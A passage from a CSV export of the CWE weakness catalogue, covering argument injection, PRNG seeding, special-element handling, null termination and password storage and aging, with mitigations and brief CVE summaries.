etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Parameterization:DESCRIPTION:Where possible, avoid building a single string that contains the command and its arguments. Some languages or frameworks have functions that support specifying independent arguments, e.g. as an array, which is used to automatically perform the appropriate quoting or escaping while building the command. For example, in PHP, escapeshellarg() can be used to escape a single argument to system(), or exec() can be called with an array of arguments. In C, code can often be refactored from using system() - which accepts a single string - to using exec(), which requires separate function arguments for each parameter.:EFFECTIVENESS:High::PHASE:Architecture and Design:STRATEGY:Input Validation:DESCRIPTION:Understand all the potential areas where untrusted inputs can enter your product: parameters or arguments, cookies, anything read from the network, environment variables, request headers as well as content, URL components, e-mail, files, databases, and any external systems that provide data to the application. Perform input validation at well-defined interfaces.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:DESCRIPTION:Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.::PHASE:Implementation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control. Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.::PHASE:Implementation:DESCRIPTION:When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so.::PHASE:Implementation:DESCRIPTION:When your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined.::PHASE:Testing:DESCRIPTION:Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.::PHASE:Testing:DESCRIPTION:Use dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.::\",\"::REFERENCE:CVE-2022-36069:DESCRIPTION:Python-based dependency management tool avoids OS command injection when generating Git commands but allows injection of optional arguments with input beginning with a dash (CWE-88), potentially allowing for code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-36069::REFERENCE:CVE-1999-0113:DESCRIPTION:Canonical Example - -froot argument is passed on to another program, where the -f causes execution as user root:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0113::REFERENCE:CVE-2001-0150:DESCRIPTION:Web browser executes Telnet sessions using command line arguments that are specified by the web site, which could allow remote attackers to execute arbitrary commands.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0150::REFERENCE:CVE-2001-0667:DESCRIPTION:Web browser allows remote attackers to execute commands by spawning Telnet with a log file option on the command line and writing arbitrary code into an executable file which is later executed.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0667::REFERENCE:CVE-2002-0985:DESCRIPTION:Argument injection vulnerability in the mail function for PHP may allow attackers to bypass safe mode restrictions and modify command line arguments to the MTA (e.g. sendmail) possibly executing commands.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0985::REFERENCE:CVE-2003-0907:DESCRIPTION:Help and Support center in windows does not properly validate HCP URLs, which allows remote attackers to execute arbitrary code via quotation marks in an hcp:// URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0907::REFERENCE:CVE-2004-0121:DESCRIPTION:Mail client does not sufficiently filter parameters of mailto: URLs when using them as arguments to mail executable, which allows remote attackers to execute arbitrary programs.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0121::REFERENCE:CVE-2004-0473:DESCRIPTION:Web browser doesn't filter - when invoking various commands, allowing command-line switches to be specified.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0473::REFERENCE:CVE-2004-0480:DESCRIPTION:Mail client allows remote attackers to execute arbitrary code via a URI that uses a UNC network share pathname to provide an alternate configuration file.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0480::REFERENCE:CVE-2004-0489:DESCRIPTION:SSH URI handler for web browser allows remote attackers to execute arbitrary code or conduct port forwarding via the a command line option.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0489::REFERENCE:CVE-2004-0411:DESCRIPTION:Web browser doesn't filter - when invoking various commands, allowing command-line switches to be specified.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0411::REFERENCE:CVE-2005-4699:DESCRIPTION:Argument injection vulnerability in TellMe 1.2 and earlier allows remote attackers to modify command line arguments for the Whois program and obtain sensitive information via -- style options in the q_Host parameter.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-4699::REFERENCE:CVE-2006-1865:DESCRIPTION:Beagle before 0.2.5 can produce certain insecure command lines to launch external helper applications while indexing, which allows attackers to execute arbitrary commands. NOTE: it is not immediately clear whether this issue involves argument injection, shell metacharacters, or other issues.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-1865::REFERENCE:CVE-2006-2056:DESCRIPTION:Argument injection vulnerability in Internet Explorer 6 for Windows XP SP2 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2056::REFERENCE:CVE-2006-2057:DESCRIPTION:Argument injection vulnerability in Mozilla Firefox 1.0.6 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2057::REFERENCE:CVE-2006-2058:DESCRIPTION:Argument injection vulnerability in Avant Browser 10.1 Build 17 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2058::REFERENCE:CVE-2006-2312:DESCRIPTION:Argument injection vulnerability in the URI handler in Skype 2.0.*.104 and 2.5.*.0 through 2.5.*.78 for Windows allows remote authorized attackers to download arbitrary files via a URL that contains certain command-line switches.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2312::REFERENCE:CVE-2006-3015:DESCRIPTION:Argument injection vulnerability in WinSCP 3.8.1 build 328 allows remote attackers to upload or download arbitrary files via encoded spaces and double-quote characters in a scp or sftp URI.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-3015::REFERENCE:CVE-2006-4692:DESCRIPTION:Argument injection vulnerability in the Windows Object Packager (packager.exe) in Microsoft Windows XP SP1 and SP2 and Server 2003 SP1 and earlier allows remote user-assisted attackers to execute arbitrary commands via a crafted file with a / (slash) character in the filename of the Command Line property, followed by a valid file extension, which causes the command before the slash to be executed, aka Object Packager Dialogue Spoofing Vulnerability.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4692::REFERENCE:CVE-2006-6597:DESCRIPTION:Argument injection vulnerability in HyperAccess 8.4 allows user-assisted remote attackers to execute arbitrary vbscript and commands via the /r option in a telnet:// URI, which is configured to use hawin32.exe.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6597::REFERENCE:CVE-2007-0882:DESCRIPTION:Argument injection vulnerability in the telnet daemon (in.telnetd) in Solaris 10 and 11 (SunOS 5.10 and 5.11) misinterprets certain client -f sequences as valid requests for the login program to skip authentication, which allows remote attackers to log into certain accounts, as demonstrated by the bin account.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-0882::REFERENCE:CVE-2001-1246:DESCRIPTION:Language interpreter's mail function accepts another argument that is concatenated to a string used in a dangerous popen() call. Since there is no neutralization of this argument, both OS Command Injection (CWE-78) and Argument Injection (CWE-88) are possible.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1246::REFERENCE:CVE-2019-13475:DESCRIPTION:Argument injection allows execution of arbitrary commands by injecting a -exec option, which is executed by the command.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-13475::REFERENCE:CVE-2016-10033:DESCRIPTION:Argument injection in mail-processing function allows writing unxpected files and executing programs using tecnically-valid email addresses that insert -o and -X switches.:LINK:https://www.cve.org/CVERecord?id=CVE-2016-10033::\",,::System Process::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Argument Injection or Modification::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ENV03-C:ENTRY NAME:Sanitize the environment when invoking external programs::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ENV33-C:ENTRY NAME:Do not call system():MAPPING FIT:Imprecise::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:STR02-C:ENTRY NAME:Sanitize data passed to complex subsystems::TAXONOMY NAME:WASC:ENTRY ID:30:ENTRY NAME:Mail Command Injection::\",::137::174::41::460::88::,\"::TYPE:Relationship:NOTE:At one layer of abstraction, this can overlap other weaknesses that have whitespace problems, e.g. injection of javascript into attributes of HTML tags.::\",\n335,\"Incorrect Usage of Seeds in Pseudo-Random Number Generator (PRNG)\",Base,Draft,\"The product uses a Pseudo-Random Number Generator (PRNG) but does not correctly manage seeds.\",\"PRNGs are deterministic and, while their output appears random, they cannot actually create entropy. They rely on cryptographically secure and unique seeds for entropy so proper seeding is critical to the secure operation of the PRNG. Management of seeds could be broken down into two main areas: (1) protecting seeds as cryptographic material (such as a cryptographic key); (2) whenever possible, using a uniquely generated seed from a cryptographically secure source PRNGs require a seed as input to generate a stream of numbers that are functionally indistinguishable from random numbers. While the output is, in many cases, sufficient for cryptographic uses, the output of any PRNG is directly determined by the seed provided as input. If the seed can be ascertained by a third party, the entire output of the PRNG can be made known to them. As such, the seed should be kept secret and should ideally not be able to be guessed. For example, the current time may be a poor seed. Knowing the approximate time the PRNG was seeded greatly reduces the possible key space. Seeds do not necessarily need to be unique, but reusing seeds may open up attacks if the seed is discovered.\",::NATURE:ChildOf:CWE ID:330:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:330:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:SCOPE:Other:IMPACT:Bypass Protection Mechanism:IMPACT:Other:NOTE:If a PRNG is used incorrectly, such as using the same seed for each initialization or using a predictable seed, then an attacker may be able to easily guess the seed and thus the random numbers. This could lead to unauthorized access to a system if the seed is used for authentication and authorization.::\",\"\",\"\",\"::REFERENCE:CVE-2020-7010:DESCRIPTION:Cloud application on Kubernetes generates passwords using a weak random number generator based on deployment time.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-7010::REFERENCE:CVE-2019-11495:DESCRIPTION:server uses erlang:now() to seed the PRNG, which results in a small search space for potential random seeds:LINK:https://www.cve.org/CVERecord?id=CVE-2019-11495::REFERENCE:CVE-2018-12520:DESCRIPTION:Product's PRNG is not seeded for the generation of session IDs:LINK:https://www.cve.org/CVERecord?id=CVE-2018-12520::REFERENCE:CVE-2016-10180:DESCRIPTION:Router's PIN generation is based on rand(time(0)) seeding.:LINK:https://www.cve.org/CVERecord?id=CVE-2016-10180::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:PRNG Seed Error::\",,\"::TYPE:Maintenance:NOTE:As of CWE 4.5, terminology related to randomness, entropy, and predictability can vary widely. Within the developer and other communities, randomness is used heavily. However, within cryptography, entropy is distinct, typically implied as a measurement. There are no commonly-used definitions, even within standards documents and cryptography papers. Future versions of CWE will attempt to define these terms and, if necessary, distinguish between them in ways that are appropriate for different communities but do not reduce the usability of CWE for mapping, understanding, or other scenarios.::\",\n168,\"Improper Handling of Inconsistent Special Elements\",Base,Draft,\"The product does not properly handle input in which an inconsistency exists between two or more special characters or reserved words.\",\"An example of this problem would be if paired characters appear in the wrong order, or if the special characters are not properly nested.\",::NATURE:ChildOf:CWE ID:159:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:228:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:SCOPE:Access Control:SCOPE:Non-Repudiation:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Bypass Protection Mechanism:IMPACT:Hide Activities::\",\"\",\"::PHASE::DESCRIPTION:Developers should anticipate that inconsistent special elements will be injected/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Inconsistent Special Elements::\",,\"\",\n170,\"Improper Null Termination\",Base,Incomplete,\"The product does not terminate or incorrectly terminates a string or array with a null character or equivalent terminator.\",\"Null termination errors frequently occur in two different ways. An off-by-one error could cause a null to be written out of bounds, leading to an overflow. Or, a program could use a strncpy() function call incorrectly, which prevents a null terminator from being added at all. Other scenarios are possible.\",::NATURE:ChildOf:CWE ID:707:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:120:VIEW ID:1000::NATURE:CanPrecede:CWE ID:126:VIEW ID:1000::NATURE:CanAlsoBe:CWE ID:147:VIEW ID:1000::NATURE:PeerOf:CWE ID:464:VIEW ID:1000::NATURE:PeerOf:CWE ID:463:VIEW ID:1000::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Resultant::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Read Memory:IMPACT:Execute Unauthorized Code or Commands:NOTE:The case of an omitted null character is the most dangerous of the possible issues. This will almost certainly result in information disclosure, and possibly a buffer overflow condition, which may be exploited to execute arbitrary code.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Read Memory:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Memory):NOTE:If a null character is omitted from a string, then most string-copying functions will read data until they locate a null character, even outside of the intended boundaries of the string. This could: cause a crash due to a segmentation fault cause sensitive adjacent memory to be copied and sent to an outsider trigger a buffer overflow when the copy is being written to a fixed-size buffer.::SCOPE:Integrity:SCOPE:Availability:IMPACT:Modify Memory:IMPACT:DoS: Crash, Exit, or Restart:NOTE:Misplaced null characters may result in any number of security problems. The biggest issue is a subset of buffer overflow, and write-what-where conditions, where data corruption occurs from the writing of a null character over valid data, or even instructions. A randomly placed null character may put the system into an undefined state, and therefore make it prone to crashing. A misplaced null character may corrupt other data in memory.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Access Control:SCOPE:Other:IMPACT:Alter Execution Logic:IMPACT:Execute Unauthorized Code or Commands:NOTE:Should the null character corrupt the process flow, or affect a flag controlling access, it may lead to logical errors which allow for the execution of arbitrary code.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Requirements:DESCRIPTION:Use a language that is not susceptible to these issues. However, be careful of null byte interaction errors (CWE-626) with lower-level constructs that may be written in a language that is susceptible.::PHASE:Implementation:DESCRIPTION:Ensure that all string functions used are understood fully as to how they append null characters. Also, be wary of off-by-one errors when appending nulls to the end of strings.::PHASE:Implementation:DESCRIPTION:If performance constraints permit, special code can be added that validates null-termination of string buffers, this is a rather naive and error-prone solution.::PHASE:Implementation:DESCRIPTION:Switch to bounded string manipulation functions. Inspect buffer lengths involved in the buffer overrun trace reported with the defect.::PHASE:Implementation:DESCRIPTION:Add code that fills buffers with nulls (however, the length of buffers still needs to be inspected, to ensure that the non null-terminated string is not written at the physical end of the buffer).::\",\"::REFERENCE:CVE-2000-0312:DESCRIPTION:Attacker does not null-terminate argv[] when invoking another program.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0312::REFERENCE:CVE-2003-0777:DESCRIPTION:Interrupted step causes resultant lack of null termination.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0777::REFERENCE:CVE-2004-1072:DESCRIPTION:Fault causes resultant lack of null termination, leading to buffer expansion.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1072::REFERENCE:CVE-2001-1389:DESCRIPTION:Multiple vulnerabilities related to improper null termination.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1389::REFERENCE:CVE-2003-0143:DESCRIPTION:Product does not null terminate a message buffer after snprintf-like call, leading to overflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0143::REFERENCE:CVE-2009-2523:DESCRIPTION:Chain: product does not handle when an input string is not NULL terminated (CWE-170), leading to buffer over-read (CWE-125) or heap-based buffer overflow (CWE-122).:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2523::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Improper Null Termination::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:String Termination Error::TAXONOMY NAME:CLASP:ENTRY NAME:Miscalculated null termination::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A9:ENTRY NAME:Denial of Service:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:POS30-C:ENTRY NAME:Use the readlink() function properly:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:STR03-C:ENTRY NAME:Do not inadvertently truncate a null-terminated byte string::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:STR32-C:ENTRY NAME:Do not pass a non-null-terminated character sequence to a library function that expects a string:MAPPING FIT:Exact::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP11:ENTRY NAME:Improper Null Termination::\",,\"::TYPE:Relationship:NOTE:Factors: this is usually resultant from other weaknesses such as off-by-one errors, but it can be primary to boundary condition violations such as buffer overflows. In buffer overflows, it can act as an expander for assumed-immutable data.::TYPE:Relationship:NOTE:Overlaps missing input terminator.::TYPE:Applicable Platform:NOTE:Conceptually, this does not just apply to the C language; any language or representation that involves a terminator could have this type of problem.::TYPE:Maintenance:NOTE:As currently described, this entry is more like a category than a weakness.::\",\n260,\"Password in Configuration File\",Base,Incomplete,\"The product stores a password in a configuration file that might be accessible to actors who do not know the password.\",\"This can result in compromise of the system for which the password is used. An attacker could gain access to this file and learn the stored password or worse yet, change the password to one of their choosing.\",::NATURE:ChildOf:CWE ID:522:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Avoid storing passwords in easily accessible locations.::PHASE:Architecture and Design:DESCRIPTION:Consider storing cryptographic hashes of passwords as an alternative to storing in plaintext.::\",\"::REFERENCE:CVE-2022-38665:DESCRIPTION:A continuous delivery pipeline management tool stores an unencypted password in a configuration file.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-38665::\",,::File or Directory::,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Password Management: Password in Configuration File::\",,\"\",\n261,\"Weak Encoding for Password\",Base,Incomplete,\"Obscuring a password with a trivial encoding does not protect the password.\",\"Password management issues occur when a password is stored in plaintext in an application's properties or configuration file. A programmer can attempt to remedy the password management problem by obscuring the password with an encoding function, such as base 64 encoding, but this effort does not adequately protect the password.\",::NATURE:ChildOf:CWE ID:522:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE::DESCRIPTION:Passwords should be encrypted with keys that are at least 128 bits in length for adequate security.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Password Management: Weak Cryptography::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A8:ENTRY NAME:Insecure Storage:MAPPING FIT:CWE More Specific::\",::55::,\"::TYPE:Other:NOTE:The crypt family of functions uses weak cryptographic algorithms and should be avoided. It may be present in some projects for compatibility.::\",\n262,\"Not Using Password Aging\",Base,Draft,\"The product does not have a mechanism in place for managing password aging.\",\"Password aging (or password rotation) is a policy that forces users to change their passwords after a defined time period passes, such as every 30 or 90 days. Without mechanisms such as aging, users might not change their passwords in a timely manner. Note that while password aging was once considered an important security feature, it has since fallen out of favor by many, because it is not as effective against modern threats compared to other mechanisms such as slow hashes. In addition, forcing frequent changes can unintentionally encourage users to select less-secure passwords. However, password aging is still in use due to factors such as compliance requirements, e.g., Payment Card Industry Data Security Standard (PCI DSS).\",::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:309:VIEW ID:1000::NATURE:PeerOf:CWE ID:324:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:As passwords age, the probability that they are compromised grows.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:As part of a product's design, require users to change their passwords regularly and avoid reusing previous passwords.::PHASE:Implementation:DESCRIPTION:Developers might disable clipboard paste operations into password fields as a way to discourage users from pasting a password into a clipboard. However, this might encourage users to choose less-secure passwords that are easier to type, and it can reduce the usability of password managers [REF-1294].:EFFECTIVENESS:Discouraged Common Practice::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Not allowing password aging::\",::16::49::509::55::555::560::561::565::600::652::653::70::,\"\",\n263,\"Password Aging with Long Expiration\",Base,Draft,\"The product supports password aging, but the expiration period is too long.\",\"Password aging (or password rotation) is a policy that forces users to change their passwords after a defined time period passes, such as every 30 or 90 days. A long expiration provides more time for attackers to conduct password cracking before users are forced to change to a new password. Note that while password aging was once considered an important security feature, it has since fallen out of favor by many, because it is not as effective against modern threats compared to other mechanisms such as slow hashes. In addition, forcing frequent changes can unintentionally encourage users to select less-secure passwords. However, password aging is still in use due to factors such as compliance requirements, e.g., Payment Card Industry Data Security Standard (PCI DSS).\",::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:As passwords age, the probability that they are compromised grows.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Ensure that password aging is limited so that there is a defined maximum age for passwords. Note that if the expiration window is too short, it can cause users to generate poor or predictable passwords.::PHASE:Architecture and Design:DESCRIPTION:Ensure that the user is notified several times leading up to the password expiration.::PHASE:Architecture and Design:DESCRIPTION:Create mechanisms to prevent users from reusing passwords or creating similar passwords.::PHASE:Implementation:DESCRIPTION:Developers might disable clipboard paste operations into password fields as a way to discourage users from pasting a password into a clipboard. However, this might encourage users to choose less-secure passwords that are easier to type, and it can reduce the usability of password managers [REF-1294].:EFFECTIVENESS:Discouraged Common Practice::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Allowing password aging::\",::16::49::509::55::555::560::561::565::600::652::653::70::,\"\",\n166,\"Improper Handling of Missing Special Element\",Base,Draft,\"The product receives input from an upstream component, but it does not handle or incorrectly handles when an expected special element is missing.\",\"\",::NATURE:ChildOf:CWE ID:159:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:228:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart::\",\"\",\"::PHASE::DESCRIPTION:Developers should anticipate that special elements will be removed in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2002-1362:DESCRIPTION:Crash via message type without separator character:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1362::REFERENCE:CVE-2002-0729:DESCRIPTION:Missing special character (separator) causes crash:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0729::REFERENCE:CVE-2002-1532:DESCRIPTION:HTTP GET without rnrn CRLF sequences causes product to wait indefinitely and prevents other users from accessing it:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1532::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Missing Special Element::\",,\"\",\n167,\"Improper Handling of Additional Special Element\",Base,Draft,\"The product receives input from an upstream component, but it does not handle or incorrectly handles when an additional unexpected special element is provided.\",\"\",::NATURE:ChildOf:CWE ID:159:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:228:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State::\",\"\",\"::PHASE::DESCRIPTION:Developers should anticipate that extra special elements will be injected in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.::PHASE:Implementation:STRATEGY:Input 